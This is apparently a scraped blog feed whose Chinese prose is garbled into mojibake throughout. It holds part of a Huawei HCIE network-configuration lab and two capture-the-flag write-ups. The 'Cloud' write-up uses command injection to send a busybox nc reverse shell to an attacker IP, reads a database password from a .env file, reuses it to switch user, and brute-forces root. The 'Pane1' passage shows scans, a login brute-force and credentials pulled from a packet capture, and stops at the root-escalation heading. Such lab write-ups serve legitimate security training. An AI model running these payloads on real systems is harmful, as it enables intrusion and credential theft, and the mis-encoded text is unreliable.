Â¶ÇÊûú‰∏çËÑ∏ÈªëÁöÑËØùÔºå‰∏Ä‰ºöÂ∞±ÂèØ‰ª•ÁúãÂà∞‰∏äÁ∫øÊàêÂäü‰∫Ü

![image-20250813105950024](http://7r1UMPHK.github.io/image/20250813214056465.webp)

ÁÑ∂ÂêéÊ†πÊçÆ‰Ω†Ê°åÂ≠ê‰∏äÁöÑÂ∞èÁ∫∏Á∫∏ÔºåÊîπÂØÜÁ†ÅÔºåÊàëËøôÂè™ÊòØÊºîÁ§∫

```
security-profile name X_Employee
security wpa-wpa2 psk pass-phrase Huawei@001 aes
y
security-profile name X_Guest
security wpa-wpa2 psk pass-phrase Huawei@001 aes
y
```

ÊµãËØïËÉΩËøû‰∏äÂ∞±Â•Ω‰∫Ü

![image-20250813110553953](http://7r1UMPHK.github.io/image/20250813214054634.webp)

# 11 ÂáÜÂÖ•ËÆ§ËØÅ

*ps:ËøôÈáåÂè™Êúâ‰∏ÄÈÉ®ÂàÜÂèØ‰ª•ÈÖçÁΩÆÔºåÊâÄ‰ª•‰∏çÁî®ËøáÂ§öÁ∫†ÁªìÔºåÂèØ‰ª•ÂÖàÁªÉ‰π†‰∏Ä‰∏ãÔºåÁÑ∂Âêé‰∏äÁúüÊú∫ÈÖçÁΩÆ*

## X_T1_AGG1/X_T2_AGG1

### radius Ê®°Êùø

Ê≤°ÊúâÂ§öÊâßË°åÔºåÈÇ£Êàë‰ª¨Â∞±ÁªÉ‰π†‰∏Ä‰∏™Â∞±Â•Ω‰∫Ü

```
radius-server template Employee
radius-server authentication 10.1.60.2 1812
radius-server shared-key cipher Huawei@123
q
radius-server authorization 10.1.60.2 shared-key cipher Huawei@123
```

### AAA

```
aaa
authentication-scheme Employee
authentication-mode radius 
q
accounting-scheme Employee
accounting-mode radius
q
authentication-scheme ap_noauthen
authentication-mode none
q
```

### ËÆ§ËØÅÂüü

```
domain employee
authentication-scheme Employee
radius-server Employee
q
domain ap_noauthen
authentication-scheme ap_noauthen
q
```

### APËÆ§ËØÅÂüüÁªëÂÆöMACÔºàenspÂÅö‰∏ç‰∫ÜÔºâ

```
domain ap_noauthen mac-authen force mac-address 'APÁöÑMACÂú∞ÂùÄ' mask ffff-fffr-fff
```

### Êé•ÂÖ•Ê®°ÊùøÔºàenspÂÅö‰∏ç‰∫ÜÔºâ

```
dotlx-access-profile name Employee
mac-access-profile name Employee
```

### ËÆ§ËØÅÊ®°ÊùøÔºàenspÂÅö‰∏ç‰∫ÜÔºâ

```
authentication-profile name Employee
dotlx-access-profile Employee
mac-access-profile Employee
authentication dotlx-mac-bypass
access-domain employee force
```

### Êé•Âè£ÂºÄËÆ§ËØÅÔºàenspÂÅö‰∏ç‰∫ÜÔºâ

‰πüÊòØ‰∏§‰∏™ÈÉΩË¶ÅÔºåÊàëËøôÂè™ÊºîÁ§∫‰∏Ä‰∏™

*ps:ËÅöÂêàÂè£ÊòØ‰ΩøÁî®‰∏ãËÅîÁöÑËÅöÂêàÁ©∫ÔºåÁÅµÊ¥ªÂ∫îÁî®*

```
int eth-trunk 2
authentication-profile Employee
int eth-truink 3
authentication-profile Employee
```

## ÂÖ®ACCÈÄè‰º†ÔºàÂÖ®ÈÉ®accÈÉΩÈúÄË¶ÅÈÖçÁΩÆÔºâ

```
l2protocol-tunnel user-defined-protocol 802.1x protocol-mac 0180-c200-0003 group-mac 0100-0000-0002
```

### Êé•Âè£ÁªëÂÆö802.1XËÆ§ËØÅÔºàÂÖ®ÈÉ®accÈÉΩÈúÄË¶ÅÈÖçÁΩÆÔºâ

```
int rang g 0/0/1 to g0/0/20           
//ËøôÊù°ensp‰∏çÊîØÊåÅÔºåenspÂèØ‰ª•‰ΩøÁî® p g g0/0/1 to g0/0/20
l2protocol-tunnel user-defined-protocol 802.1x enable
q
interface Eth-Trunk 1             //‰∏äËÅîËÅöÂêàÂè£
l2protocol-tunnel user-defined-protocol 802.1x enable
```

# 12 ÁΩëÁªúÂÆâÂÖ®ÈúÄÊ±Ç

## 12.1 vsys EmployeeÈÖçÁΩÆ

### 12.1.1 Âú∞ÂùÄÈõÜ

#### X_T1_FW1

```
switch vsys Employee
sy
ip address-set market type group
address 10.1.11.0 mask 24
address 10.1.12.0 mask 24
address 10.1.13.0 mask 24
address 10.1.14.0 mask 24
address 10.1.15.0 mask 24

ip address-set procure type group
address 10.1.21.0 mask 24
address 10.1.22.0 mask 24
address 10.1.23.0 mask 24
address 10.1.24.0 mask 24
address 10.1.25.0 mask 24

ip address-set wlan type group
address 10.1.51.0 mask 24
address 10.1.52.0 mask 24
address 10.1.53.0 mask 24
address 10.1.54.0 mask 24
address 10.1.55.0 mask 24

ip address-set hr-finance type group
address 10.1.31.0 mask 24
address 10.1.32.0 mask 24
address 10.1.33.0 mask 24
address 10.1.34.0 mask 24
address 10.1.35.0 mask 24
address 10.1.41.0 mask 24
address 10.1.42.0 mask 24
address 10.1.43.0 mask 24
address 10.1.44.0 mask 24
address 10.1.45.0 mask 24

ip address-set X-Y-Z type group
address 10.3.101.0 mask 24
address 10.100.2.0 mask 24
address 10.2.31.0 mask 24
address 10.2.32.0 mask 24
address 10.2.33.0 mask 24
address 10.2.34.0 mask 24
address 10.2.35.0 mask 24
address 10.2.41.0 mask 24
address 10.2.42.0 mask 24
address 10.2.43.0 mask 24
address 10.2.44.0 mask 24
address 10.2.45.0 mask 24
address 10.2.51.0 mask 24
address 10.2.52.0 mask 24
address 10.2.53.0 mask 24
address 10.2.54.0 mask 24
address 10.2.55.0 mask 24
q
quit
quit
```

### 12.1.2 ÈáçÂÆöÂêëÂÜÖÈÉ®Êó†Á∫øËÆøÈóÆÊúçÂä°Âô®ÊµÅÈáè

#### X_T1_Core1

```
acl number 3000
rule permit ip source 10.1.51.0 0.0.0.255 destination 10.1.60.0 0.0.0.255
rule permit ip source 10.1.52.0 0.0.0.255 destination 10.1.60.0 0.0.0.255
rule permit ip source 10.1.53.0 0.0.0.255 destination 10.1.60.0 0.0.0.255
rule permit ip source 10.1.54.0 0.0.0.255 destination 10.1.60.0 0.0.0.255
rule permit ip source 10.1.55.0 0.0.0.255 destination 10.1.60.0 0.0.0.255
q
interface g0/0/3
# enspÂä†‰∏ç‰∫ÜÂÆû‰æãÔºåÊâÄ‰ª•ÊÉ≥ÈÖçÂ∞±ÈÖçÔºå‰∏çÈÖçÂ∞±ÁÆó‰∫Ü
trafiic-redirect inbound acl 3000 vpn-ins Employee ip-nexthop 10.1.200.22
q
```

### 12.1.3 ÂÆâÂÖ®Á≠ñÁï•

#### X_T1_FW1

```
switch vsys Employee
sy
security-policy
rule name permit60.101
source-zone untrust
destination-zone trust
destination-address 10.1.60.101 mask 255.255.255.255
service http
action permit
q

rule name perimit60.100
source-zone trust
destination-zone trust
source-address address-set wlan
destination-address 10.1.60.100 mask 255.255.255.255
action permit
q

rule name deny60.0
source-zone trust
destination-zone trust
source-address address-set wlan
destination-address 10.1.60.100 mask 255.255.255.255
action deny
q

rule name Z-Y-X
source-zone untrust
source-zone trust
destination-zone untrust
destination-zone trust
source-address address-set X-Y-Z
source-address address-set market procure hr-finance wlan
destination-address address-set market procure hr-finance wlan
destination-address address-set X-Y-Z
action permit
q

rule name permitany
source-zone trust
destination-zone untruist
source-address address-set wlan
source-address address-set market
source-address address-set procure
action permit
q
q
quit
quit
```

![image-20250813160936283](http://7r1UMPHK.github.io/image/20250813214050584.webp)

![image-20250813161001465](http://7r1UMPHK.github.io/image/20250813214049075.webp)

## 12.2 vsys Guest

### 12.2.1 Âú∞ÂùÄÈõÜ

```
switch vsys Guest
sy
ip address-set Guest type group
address 10.1.101.0 mask 24
address 10.1.102.0 mask 24
address 10.1.103.0 mask 24
address 10.1.104.0 mask 24
address 10.1.105.0 mask 24
q
```

### 12.2.2 ÂÆâÂÖ®Á≠ñÁï•

#### ÊúçÂä°ÈõÜ

```
ip service-set Guest_Service type object 16
service 0 protocol tcp destination-port 3389
q
```

#### ÂÆâÂÖ®Á≠ñÁï•

```
security-policy
rule name permit60.99
source-zone trust
destination-zone untrust
source-address address-set Guest
destination-address 10.1.60.99 mask 255.255.255.255
service Guest_Service
action permit
q

rule name deny60.0_Y_Z
source-zone trust
destination-zone untrust
source-address address-set Guest
destination-address 10.1.60.0 mask 255.255.255.0
destination-address 10.10.0.0 mask 255.255.0.0
destination-address 10.100.0.0 mask 255.255.0.0
destination-address 10.2.0.0 mask 255.255.0.0
destination-address 10.3.0.0 mask 255.255.0.0
action deny
rule name permitany
source-zone trust
destination-zone untrust
source-address address-set Guest
action permit
q
```

![image-20250813160805716](http://7r1UMPHK.github.io/image/20250813214046853.webp)

## 12.3 vsys ‰πãÈó¥ÁöÑËΩ¨Âèë

### Employee

```
switch vsys Employee
sy
interface Virtual-if1
ip address 10.1.200.253 255.255.255.255
q
firewall zone untrust
add interface Virtual-if1
q
quit
quit
```

### Guest

```
switch vsys Guest
sy
interface Virtual-if2
ip address 10.1.200.254 255.255.255.255
q
firewall zone untrust
add interface Virtual-if2
q
quit
quit
```

### ÂÖ¨ÂÖ±

```
ip route-static vpn-instance Guest 10.1.60.99 255.255.255.255 vpn-instance Employee
ip route-static vpn-instance Employee 10.1.101.0 255.255.255.0 vpn-instance Guest
ip route-static vpn-instance Employee 10.1.102.0 255.255.255.0 vpn-instance Guest
ip route-static vpn-instance Employee 10.1.103.0 255.255.255.0 vpn-instance Guest
ip route-static vpn-instance Employee 10.1.104.0 255.255.255.0 vpn-instance Guest
ip route-static vpn-instance Employee 10.1.105.0 255.255.255.0 vpn-instance Guest
```

### Employee

```
ip address-set Guest type group
address 10.1.101.0 mask 24
address 10.1.102.0 mask 24
address 10.1.103.0 mask 24
address 10.1.104.0 mask 24
address 10.1.105.0 mask 24
q

ip service-set Guest_Service type object 17
service 0 protocol tcp destination-port 3389
q

security-policy
rule name permit60.99
source-zone untrust
destination-zone trust
source-address address-set Guest
destination-address 10.1.60.99 mask 255.255.255.255
service Guest_Service
action permit
```

# È™åËØÅ

ÂÖàÊääFW1ÁöÑicmpÊâìÂºÄ

```
icmp ttl-exceeded send
```

![image-20250813162920742](http://7r1UMPHK.github.io/image/20250813214044313.webp)

![image-20250813163121733](http://7r1UMPHK.github.io/image/20250813214042640.webp)

![image-20250813163304351](http://7r1UMPHK.github.io/image/20250813214038287.webp)sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/HCIE-Q1.html</guid><pubDate>Wed, 13 Aug 2025 13:42:18 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Cloud</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Cloud.html</link><description># ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

## 1. ‰∏ªÊú∫ÂèëÁé∞

È¶ñÂÖàÔºå‰ΩøÁî® `arp-scan` Âú® `192.168.205.0/24` ÁΩëÊÆµ‰∏≠ÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.142 08:00:27:0f:75:63       PCS Systemtechnik GmbH
...
```

Á°ÆËÆ§ÁõÆÊ†á‰∏ªÊú∫IPÂú∞ÂùÄ‰∏∫ `192.168.205.142`„ÄÇ

## 2. Á´ØÂè£Êâ´Êèè‰∏éÊúçÂä°Êé¢Êµã

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºåËØÜÂà´ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.142
...
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
666/tcp   open  doom
9443/tcp  open  tungsten-https
9455/tcp  open  unknown
65443/tcp open  unknown
...
```

Êâ´ÊèèÂèëÁé∞Â§ö‰∏™ÂºÄÊîæÁ´ØÂè£„ÄÇÂÖ∂‰∏≠ `9455` Á´ØÂè£ËøêË°åÁùÄ‰∏Ä‰∏™Êú™Áü•ÁöÑ‚ÄúAdmin Service‚ÄùÔºåËøôÈÄöÂ∏∏ÊòØÂÄºÂæó‰ºòÂÖàÊé¢Á¥¢ÁöÑÁ™ÅÁ†¥Âè£„ÄÇ‰ΩøÁî® `netcat` ËøûÊé•ËØ•ÊúçÂä°ËøõË°å‰∫§‰∫í„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc 192.168.205.142 9455
Welcome to Admin Service
Type 'help' for available commands
Available commands:
  help          - Show this help
  whoami        - Show current user
  system-status - Show system status
  exit          - Disconnect
```

Âú®‰∫§‰∫íÂºèShell‰∏≠ËæìÂÖ• `help`ÔºåÂèëÁé∞‰∏Ä‰∏™ÈöêËóèÁöÑÂëΩ‰ª§ `show-admin-pass`„ÄÇ

```bash
help
Available commands:
  help          - Show this help
  whoami        - Show current user
  system-status - Show system status
  show-admin-pass - Show admin password
  exit          - Disconnect
show-admin-pass
Admin Password: 5jRrRnE9
```

ÊàêÂäüËé∑ÂèñÂà∞‰∏Ä‰∏™ÁÆ°ÁêÜÂëòÂØÜÁ†Å `5jRrRnE9`„ÄÇÊ†πÊçÆÁ´ØÂè£Êâ´ÊèèÁªìÊûúÔºå`9443` Á´ØÂè£ËøêË°åÁùÄ‰∏Ä‰∏™Èõ∑Ê±†WAFÔºåÊé®ÊµãËØ•ÂØÜÁ†ÅÊòØWAFÁöÑÁôªÂΩïÂá≠ËØÅ„ÄÇ

# ‰∫å„ÄÅWebÊ∏óÈÄè‰∏éÁ´ãË∂≥ÁÇπ

## 1. ÁªïËøáWAFÈò≤Êä§

ËÆøÈóÆ `https://192.168.205.142:9443`ÔºåËøõÂÖ•Èõ∑Ê±†WAFÁöÑÁôªÂΩïÈ°µÈù¢„ÄÇ‰ΩøÁî®Áî®Êà∑Âêç `admin` Âíå‰∏ä‰∏ÄÊ≠•Ëé∑ÂèñÁöÑÂØÜÁ†Å `5jRrRnE9` ÊàêÂäüÁôªÂΩï„ÄÇ

Âú®WAFÁöÑÁÆ°ÁêÜÂêéÂè∞‰∏≠ÔºåÂèëÁé∞ÂÖ∂Èò≤Êä§‰∫Ü‰∏Ä‰∏™WebÂ∫îÁî®Ôºå‰ΩÜËØ•Â∫îÁî®ÂΩìÂâçÂ§Ñ‰∫é‚ÄúÁª¥Êä§Ê®°Âºè‚Äù„ÄÇËøôÊòØÂØºËá¥Áõ¥Êé•ËÆøÈóÆ80Á´ØÂè£È°µÈù¢ÂºÇÂ∏∏ÁöÑÂéüÂõ†„ÄÇ

Êàë‰ª¨Â∞ÜÈò≤Êä§Ê®°Âºè‰ªé‚ÄúÁª¥Êä§‚ÄùÂàáÊç¢‰∏∫‚ÄúËßÇÂØü‚ÄùÔºå‰ΩøWebÂ∫îÁî®ÊÅ¢Â§çÊ≠£Â∏∏ËÆøÈóÆ„ÄÇ

![image-20250813213042337](http://7r1UMPHK.github.io/image/20250813213325461.webp)

## 2. ÂëΩ‰ª§Ê≥®ÂÖ•‰∏éGetshell

ÈáçÊñ∞ËÆøÈóÆ `http://192.168.205.142`ÔºåÈ°µÈù¢ÊòæÁ§∫‰∏∫‰∏Ä‰∏™ÊúçÂä°Âô®Áä∂ÊÄÅÊ£ÄÊü•Â∑•ÂÖ∑„ÄÇÈ°µÈù¢‰∏≠Â≠òÂú®‰∏Ä‰∏™‚ÄúËá™ÂÆö‰πâÂëΩ‰ª§‚ÄùÁöÑËæìÂÖ•ÁÇπÔºåÊöóÁ§∫ÂèØËÉΩÂ≠òÂú®ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û„ÄÇ

Êàë‰ª¨Âú®Ê≠§Â§ÑÁõ¥Êé•ÊûÑÈÄ†ÂèçÂºπShellÁöÑPayloadÔºåÂπ∂Áî® `nc` Âú®KaliÊîªÂáªÊú∫‰∏äËøõË°åÁõëÂê¨„ÄÇ

* **Payload**: `busybox nc 192.168.205.128 8888 -e /bin/bash`

* **KaliÁõëÂê¨**:

  ```bash
  ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
  ‚îî‚îÄ$ nc -lvnp 8888
  listening on [any] 8888 ...
  connect to [192.168.205.128] from (UNKNOWN) [192.168.205.142] 37450
  id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

ÊàêÂäüÊé•Êî∂Âà∞ÂèçÂºπShellÔºåËé∑Âæó `www-data` Áî®Êà∑ÊùÉÈôê„ÄÇ

* **Á®≥ÂÆöShell:**

  ```bash
  script /dev/null -c bash
  Ctrl+Z
  stty raw -echo; fg
  reset xterm
  export TERM=xterm
  export SHELL=/bin/bash
  stty rows 24 columns 80
  ```

# ‰∏â„ÄÅÊùÉÈôêÊèêÂçá

## 1. Ê®™ÂêëÁßªÂä® (www-data -&gt; lucky)

Âú® `www-data` ÁöÑShell‰∏≠ËøõË°å‰ø°ÊÅØÊî∂ÈõÜÔºåÂú® `/data/safeline/` ÁõÆÂΩï‰∏ãÂèëÁé∞‰∏Ä‰∏™ÊïèÊÑüÁöÑÁéØÂ¢ÉÂèòÈáèÈÖçÁΩÆÊñá‰ª∂ `.env`„ÄÇ

```bash
www-data@Cloud:/tmp$ cat /data/safeline/.env
SAFELINE_DIR=/data/safeline
POSTGRES_PASSWORD=vivrdIDj6fhNJIRdnitL
MGT_PORT=9443
RELEASE=
CHANNEL=
REGION=
IMAGE_PREFIX=swr.cn-east-3.myhuaweicloud.com/chaitin-safeline
IMAGE_TAG=9.2.1
SUBNET_PREFIX=192.168.0
ARCH_SUFFIX=
```

ËØ•Êñá‰ª∂Ê≥ÑÈú≤‰∫Ü‰∏Ä‰∏™PostgreSQLÊï∞ÊçÆÂ∫ìÂØÜÁ†Å `vivrdIDj6fhNJIRdnitL`„ÄÇËÄÉËôëÂà∞ÂØÜÁ†ÅÂ§çÁî®ÁöÑÂèØËÉΩÊÄßÔºåÂ∞ùËØï‰ΩøÁî®Ê≠§ÂØÜÁ†ÅÂàáÊç¢Âà∞Á≥ªÁªü‰∏≠ÁöÑÂÖ∂‰ªñÁî®Êà∑„ÄÇ

```bash
www-data@Cloud:/tmp$ su lucky
Password: vivrdIDj6fhNJIRdnitL
lucky@Cloud:/home$ id
uid=1000(lucky) gid=1000(lucky) groups=1000(lucky)
```

ÊàêÂäü‰ΩøÁî®ËØ•ÂØÜÁ†ÅÂàáÊç¢Âà∞ `lucky` Áî®Êà∑ÔºåÂÆåÊàê‰∫ÜÊ®™ÂêëÁßªÂä®„ÄÇ

## 2. ÊèêÊùÉËá≥root (lucky -&gt; root)

Âú® `lucky` Áî®Êà∑ÁöÑÂÆ∂ÁõÆÂΩï‰∏ãÔºåÂèëÁé∞‰∏Ä‰∏™Âêç‰∏∫ `.hint` ÁöÑÊèêÁ§∫Êñá‰ª∂„ÄÇ

```bash
lucky@Cloud:~$ cat .hint
root password length is 4.
Regex is : 'r..o'
```

ÊèêÁ§∫‰ø°ÊÅØÁªôÂá∫‰∫Ü `root` ÂØÜÁ†ÅÁöÑÊ†ºÂºèÔºöÈïøÂ∫¶‰∏∫4Ôºå‰∏îÁ¨¶ÂêàÊ≠£ÂàôË°®ËææÂºè `'r..o'`„ÄÇÊàë‰ª¨ÂèØ‰ª•ÊçÆÊ≠§ÁîüÊàê‰∏Ä‰∏™ÂØÜÁ†ÅÂ≠óÂÖ∏ÔºåÁÑ∂ÂêéËøõË°åÁàÜÁ†¥„ÄÇ

1. **ÁîüÊàêÂ≠óÂÖ∏**Ôºö

   ```bash
   lucky@Cloud:~$ for a in {a..z}; do for b in {a..z}; do echo 'r${a}${b}o'; done; done &gt; /tmp/pass
   ```

2. **Êö¥ÂäõÁ†¥Ëß£**Ôºö
   ‰ΩøÁî® `su` ÁàÜÁ†¥ËÑöÊú¨ÔºàÂ¶Ç `suForce`ÔºâÂíåÁîüÊàêÁöÑÂ≠óÂÖ∏ÂØπ `root` Ë¥¶Êà∑ËøõË°åÂØÜÁ†ÅÁåúËß£„ÄÇ

   ```bash
   lucky@Cloud:/tmp$ ./suForce -u root -w pass
   ...
   üí• Password | rooo
   ...
   ```

   ÊàêÂäüÁ†¥Ëß£Âá∫ `root` Áî®Êà∑ÁöÑÂØÜÁ†Å‰∏∫ `rooo`„ÄÇ

3. **ÂàáÊç¢Ëá≥root**Ôºö

   ```bash
   lucky@Cloud:/tmp$ su -
   Password: rooo
   root@Cloud:~# id
   uid=0(root) gid=0(root) groups=0(root)
   ```

   ÊàêÂäüËé∑ÂæórootÊùÉÈôê„ÄÇ

# Âõõ„ÄÅËé∑ÂèñFlag

Áé∞Âú®Êã•Êúâ‰∫ÜrootÊùÉÈôêÔºåÂèØ‰ª•ËØªÂèñÊâÄÊúâÁöÑFlag„ÄÇ

```bash
root@Cloud:~# cat /root/root.txt
flag{root-74cc1c60799e0a786ac7094b532f01b1}

root@Cloud:~# cat /home/lucky/user.txt
flag{user-72cfd272ace172fa35026445fbef9b03}
```

ÊâÄÊúâFlagÂùáÂ∑≤ÊâæÂà∞ÔºåÊ∏óÈÄèÊµãËØïÂÆåÊàê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Cloud.html</guid><pubDate>Wed, 13 Aug 2025 13:34:20 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Pane1</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Pane1.html</link><description># ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

## 1. ‰∏ªÊú∫ÂèëÁé∞

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l                           
...
192.168.205.132 08:00:27:e2:db:af       PCS Systemtechnik GmbH
...
```

Á°ÆËÆ§ÁõÆÊ†á‰∏ªÊú∫IPÂú∞ÂùÄ‰∏∫ `192.168.205.132`„ÄÇ

## 2. Á´ØÂè£Êâ´Êèè

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºåËØÜÂà´ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.132            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 09:24 EDT
Nmap scan report for 192.168.205.132
Host is up (0.00018s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
38415/tcp open  unknown
MAC Address: 08:00:27:E2:DB:AF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p38415 -sC -sV 192.168.205.132
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 09:26 EDT
Nmap scan report for 192.168.205.132
Host is up (0.00032s latency).

PORT      STATE SERVICE VERSION
38415/tcp open  http    Golang net/http server
|_http-title: \xE6\x9A\x82\xE6\x97\xB6\xE6\x97\xA0\xE6\xB3\x95\xE8\xAE\xBF\xE9\x97\xAE
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: panel_public_key=LS0tLS1C...
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÂºÄÊîæ‰∫Ü **22 (SSH)**, **80 (HTTP)**, Âíå **38415** ‰∏â‰∏™Á´ØÂè£„ÄÇÂØπ38415Á´ØÂè£ÁöÑËøõ‰∏ÄÊ≠•Êâ´ÊèèÊòæÁ§∫ÂÆÉÊòØ‰∏Ä‰∏™GolangÁöÑHTTPÊúçÂä°„ÄÇ

## 3. WebÁõÆÂΩïÊâ´Êèè

‰ΩøÁî® `gobuster` ÂØπ80Á´ØÂè£ÁöÑWebÊúçÂä°ËøõË°åÁõÆÂΩïÁàÜÁ†¥ÔºåÂèëÁé∞Âá†‰∏™Ê†áÂáÜPHPÈ°µÈù¢„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.132 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
...
/index.php            (Status: 200)
/logout.php           (Status: 302)
/dashboard.php        (Status: 302)
...
```

# ‰∫å„ÄÅWebÊ∏óÈÄè‰∏éÁ´ãË∂≥ÁÇπ

# 1. ÂêéÂè∞ÁôªÂΩïÁàÜÁ†¥

ËÆøÈóÆ `http://192.168.205.132` ÊòØ‰∏Ä‰∏™ÁôªÂΩïÈù¢Êùø„ÄÇ38415ÊòØ1Panel Ôºå‰ΩÜÊòØÊòæÁ§∫‚ÄúÊó†Ê≥ïËÆøÈóÆÔºåÂΩìÂâçÁéØÂ¢ÉÂ∑≤ÁªèÂºÄÂêØ‰∫ÜÂÆâÂÖ®ÂÖ•Âè£ÁôªÂΩï‚ÄùÔºåÊàëËøò‰ª•‰∏∫ÊòØÊâìCVE-2025-54424Ôºå‰ΩÜÊòØÁúã‰∫Ü‰∏Ä‰∏ãÔºåËøô‰∏™ÊºèÊ¥ûÈúÄË¶ÅhttpsËØ∑Ê±ÇÔºåÁ°ÆÂàáÁöÑËØ¥ÊòØtlsÈÄö‰ø°Ôºå‰ΩÜÊòØÊàë‰ª¨ÁöÑËØ∑Ê±ÇÊòØhttpÁöÑÔºåÊâÄ‰ª•ÊöÇÊó∂‰∏çÁÆ°„ÄÇ

ÈÇ£Â∞±ÁÆÄÂçïÁöÑÁàÜÁ†¥‰∏Ä‰∏ã80 webÁöÑÂØÜÁ†ÅÔºåËæìÂÖ•‰∫ÜÂá†‰∏™Â∏∏ËßÅÁöÑÁî®Êà∑admin,root,guest,testÔºåÁàÜÁ†¥Ê≤°Êî∂Ëé∑Ôºå‰ΩÜÊòØÂèëÁé∞‰∫Ü‰∏ÄÁÇπÈóÆÈ¢òÔºåÂÆÉÁàÜÁ†¥ÁöÑÂæàÂø´ÔºåÈÇ£ÊàëÁî®Êà∑ÂêçÈÇ£ÈáåÂ∞±Áõ¥Êé•‰ΩøÁî®burpÁöÑÁî®Êà∑ÂêçÂàóË°®ÔºåÁÑ∂ÂêéÂØÜÁ†Å‰ΩøÁî®5000q.txtÔºàrockyouÂâç5000Ë°åÔºâ

![image-20250812213450561](http://7r1UMPHK.github.io/image/20250812221133339.webp)

ÊàêÂäüÁàÜÁ†¥Âá∫‰∏ÄÁªÑÂá≠ËØÅÔºö

*   **Áî®Êà∑Âêç**: `administrator`
*   **ÂØÜÁ†Å**: `123456`

## 2. ‰ø°ÊÅØÊ≥ÑÈú≤‰∏éÊ®™ÂêëÁßªÂä®

‰ΩøÁî®‰∏äËø∞Âá≠ËØÅÁôªÂΩïÂêéÂè∞ÔºåÂú®‰ª™Ë°®ÁõòÈ°µÈù¢ÂèëÁé∞ÂÖ≥ÈîÆ‰ø°ÊÅØ„ÄÇÈ°µÈù¢ÊèêÁ§∫1PanelÂÖ∂ÂÆâÂÖ®ËÆøÈóÆË∑ØÂæÑÔºö`/122b059247/`

Ê≠§Â§ñÔºåÈ°µÈù¢ËøòÊèê‰æõ‰∫Ü‰∏Ä‰∏™Êï∞ÊçÆÂåÖÊñá‰ª∂‰æõ‰∏ãËΩΩ„ÄÇËøôÊàëÁÜüÂïä:)

![image-20250812213735688](http://7r1UMPHK.github.io/image/20250812221138105.webp)

ËÆøÈóÆ `http://192.168.205.132:38415/122b059247/`ÔºåÁ°ÆËÆ§ÊòØ‰∏Ä‰∏™1PanelÁöÑÁôªÂΩïÁïåÈù¢„ÄÇÂ∞ùËØï‰∫ÜÂá†‰∏™Âº±ÂØÜÁ†ÅÔºåÊó†ÊûúÔºå‰∏ãËΩΩÊäìÂåÖÊü•Áúã„ÄÇ

## 3. Êï∞ÊçÆÂåÖÂàÜÊûê

‰∏ãËΩΩÂêéÂè∞Êèê‰æõÁöÑÊï∞ÊçÆÂåÖÊñá‰ª∂ÔºåÂπ∂‰ΩøÁî®WiresharkËøõË°åÂàÜÊûê„ÄÇÂÖàÂ∞ùËØïËøáÊª§`tcp.port == 38415`Ê≤°ÁªìÊûúÔºåÁÑ∂ÂêéÈÄöËøáÂ≠óÁ¨¶‰∏≤ÊêúÁ¥¢ÂäüËÉΩÊü•ÊâæÂÖ≥ÈîÆÂ≠óÔºåÈÄâÊã© 'Packet bytes' Âíå 'String' ÊêúÁ¥¢'password'ÔºåÊàêÂäüÂèëÁé∞‰∫Ü‰∏âÁªÑÁôªÂΩïÂá≠ËØÅÔºö

*   `root:root`
*   `admin:admin`
*   `root:superpassword123`

‰ΩøÁî®ÊúÄÂêé‰∏ÄÁªÑÂá≠ËØÅ `root:superpassword123` ÊàêÂäüÁôªÂΩï1PanelÂêéÂè∞„ÄÇ

# ‰∏â„ÄÅÊùÉÈôêÊèêÂçá

## 1. Âà©Áî®1PanelËé∑ÂèñRootÊùÉÈôê

